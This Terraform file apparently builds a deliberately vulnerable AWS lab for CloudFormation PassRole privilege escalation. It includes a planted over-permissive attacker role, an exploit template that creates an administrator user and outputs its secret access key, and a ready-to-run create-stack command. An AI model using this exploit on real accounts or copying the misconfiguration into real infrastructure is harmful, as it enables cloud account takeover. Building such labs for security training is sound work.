variable "random_suffix" {
  description = "Random suffix for resource names"
  type        = string
}

// Get current account ID
data "aws_caller_identity" "current" {}

// Create a high-privilege role that can be passed to CloudFormation
resource "aws_iam_role" "vuln_cf_createstack_target" {
  name = "vuln-cloudformation-createstack-target-${var.random_suffix}"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          Service = "cloudformation.amazonaws.com"
        }
        Action = "sts:AssumeRole"
      }
    ]
  })

  lifecycle {
    ignore_changes = [
      tags,
      tags_all
    ]
  }
}

// Attach AdministratorAccess policy to the target role
resource "aws_iam_role_policy_attachment" "vuln_cf_createstack_target_admin" {
  role       = aws_iam_role.vuln_cf_createstack_target.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}

// Create an attacker role with limited permissions but can pass roles and create stacks
resource "aws_iam_role" "vuln_cf_createstack_attacker" {
  name = "vuln-cloudformation-createstack-attacker-${var.random_suffix}"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          AWS = "arn:aws:iam::${data.aws_caller_identity.current.account_id}:root"
        }
        Action = "sts:AssumeRole"
      }
    ]
  })

  lifecycle {
    ignore_changes = [
      tags,
      tags_all
    ]
  }
}

// Create a policy that allows the attacker to pass roles and create CloudFormation stacks
resource "aws_iam_policy" "vuln_cf_createstack_permission_policy" {
  name        = "vuln-cloudformation-createstack-permission-policy-${var.random_suffix}"
  description = "Policy that allows passing roles and creating CloudFormation stacks"

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "iam:PassRole"
        ]
        Resource = aws_iam_role.vuln_cf_createstack_target.arn
      },
      {
        Effect = "Allow"
        Action = [
          "cloudformation:CreateStack",
          "cloudformation:DescribeStacks",
          "cloudformation:GetTemplate",
          "cloudformation:ListStacks"
        ]
        Resource = "*"
      },
      {
        Effect = "Allow"
        Action = [
          "iam:ListRoles",
          "iam:GetRole"
        ]
        Resource = "*"
      }
    ]
  })

  lifecycle {
    ignore_changes = [
      tags,
      tags_all
    ]
  }
}

// Attach the permission policy to the attacker role
resource "aws_iam_role_policy_attachment" "vuln_cf_createstack_permission_attach" {
  role       = aws_iam_role.vuln_cf_createstack_attacker.name
  policy_arn = aws_iam_policy.vuln_cf_createstack_permission_policy.arn
}

// Output variables
output "vuln_cf_createstack_attacker_role" {
  value       = aws_iam_role.vuln_cf_createstack_attacker.name
  description = "Name of the attacker role with CloudFormation CreateStack and PassRole permissions"
}

output "vuln_cf_createstack_attacker_role_arn" {
  value       = aws_iam_role.vuln_cf_createstack_attacker.arn
  description = "ARN of the attacker role"
}

output "vuln_cf_createstack_target_role" {
  value       = aws_iam_role.vuln_cf_createstack_target.name
  description = "Name of the high-privilege role that can be passed to CloudFormation"
}

output "vuln_cf_createstack_target_role_arn" {
  value       = aws_iam_role.vuln_cf_createstack_target.arn
  description = "ARN of the target role"
}

output "exploit_description" {
  value       = "Create a CloudFormation template that uses the target role to create privileged resources, then use CreateStack with PassRole to deploy it"
  description = "Description of how to exploit this vulnerability"
}

// Create an example CloudFormation template as a local file for exploitation
resource "local_file" "exploit_template" {
  filename = "/tmp/exploit-template-${var.random_suffix}.yaml"
  content = yamlencode({
    AWSTemplateFormatVersion = "2010-09-09"
    Description              = "Exploit template for privilege escalation via CloudFormation"
    Resources = {
      ExploitUser = {
        Type = "AWS::IAM::User"
        Properties = {
          UserName = "exploit-user-${var.random_suffix}"
          ManagedPolicyArns = [
            "arn:aws:iam::aws:policy/AdministratorAccess"
          ]
        }
      }
      ExploitAccessKey = {
        Type = "AWS::IAM::AccessKey"
        Properties = {
          UserName = {
            Ref = "ExploitUser"
          }
        }
      }
    }
    Outputs = {
      AccessKeyId = {
        Value = {
          Ref = "ExploitAccessKey"
        }
      }
      SecretAccessKey = {
        Value = {
          "Fn::GetAtt" = ["ExploitAccessKey", "SecretAccessKey"]
        }
      }
    }
  })
}

output "exploit_template_path" {
  value       = local_file.exploit_template.filename
  description = "Path to the example CloudFormation template for exploitation"
}

output "exploit_command" {
  value       = "aws cloudformation create-stack --stack-name exploit-stack-${var.random_suffix} --template-body file://${local_file.exploit_template.filename} --role-arn ${aws_iam_role.vuln_cf_createstack_target.arn} --capabilities CAPABILITY_IAM"
  description = "Command to exploit the vulnerability by creating a CloudFormation stack that creates an admin user"
} 